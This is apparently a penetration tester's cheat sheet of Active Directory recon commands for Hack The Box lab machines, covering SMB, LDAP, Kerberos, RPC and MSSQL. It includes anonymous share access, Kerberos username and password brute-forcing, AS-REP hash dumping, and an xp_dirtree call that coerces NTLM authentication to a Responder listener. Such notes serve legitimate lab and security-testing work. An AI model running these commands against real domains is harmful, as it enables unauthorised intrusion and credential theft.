# Recon
## SMB
```sh
crackmapexec smb authority.htb
```
### SMBMAP
##### List shares
```sh
smbmap -H forest.htb
```
##### List all files in share
```sh
smbmap -R SHARENAME -H IP 
```
##### Download specific file
```sh
smbmap -R SHARENAME -H IP -A FILENAME -q 
```

### Crackmapexec
```sh
crackmapexec smb authority.htb --shares
```
##### enum smb shares/users
```sh
crackmapexec smb .htb --shares -u "" -p ""
crackmapexec smb .htb --users -u "" -p ""
```
##### anonymous authentication smb 
```sh
crackmapexec smb authority.htb --shares -u "anything" -p ""
```
##### access share without password
```sh
smbclient -N //authority.htb/SHARE -U "anything"
```
##### Access share with password
```sh
smbclient -N //authority.htb/SHARE -U "USER" --password 'PASS'
```
##### download all files from smb share
```sh
smb: \> prompt
smb: \> recurse ON
smb: \> mget *
```
##### List all users
```sh
crackmapexec smb forest.htb  -u '' -p '' --users
```

##### Enum Everything
```sh
crackmapexec smb 10.10.10.1 -u 'anonymous' -p '' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```

## LDAP
Try to login with LDAP creds on different services. Try ex: winRM.
To receive the LDAP credentials, set up a listener and check connection on ldap. The credentials are often passed in plaintext.
##### Enumerate Domain
```sh
crackmapexec ldap authority.htb -u 'USER' -p 'PASS' --trusted-for-delegation  --password-not-required --admin-count --users --groups
```
##### Nmap enum 
```sh
sudo nmap -n -sV --script "ldap* and not brute" -p 389 IP
```
##### Query LDAP with creds
```sh
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'PASSWORD' -b "DC=support,DC=htb" "*"
```

## Kerberos
##### Nmap enum
```sh
nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm='manager.htb' IP
```
##### Bruteforce usernames
```sh
./kerbrute_linux_amd64 userenum --dc 10.129.105.163 -d manager.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
```
##### Bruteforce password
```sh
./kerbrute_linux_amd64 bruteuser --dc 10.129.38.49 -d htb.local /usr/share/wordlists/rockyou.txt mark
```
##### Get hashes for kerberoast
```sh
impacket-GetNPUsers htb.local/ -dc-ip 10.129.38.49 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
```

### RPC
##### Anonymous login
```sh
rpcclient -U "" manager.htb
> enumdomusers
> enumdomgroups
> queryuser 0x45e
```
##### With creds
```sh
rpcclient -N -U "Operator%operator" manager.htb
```


### MsSQL
```sh
impacket-mssqlclient -dc-ip 10.129.105.163 -port 1433 manager.htb/Operator:operator@manager.htb -windows-auth

# start listener: sudo responder -I tun0
> xp_dirtree \\LOCAL_IP\uwu

> exec xp_dirtree 'C:\Users'
```


## Techniques 
https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/
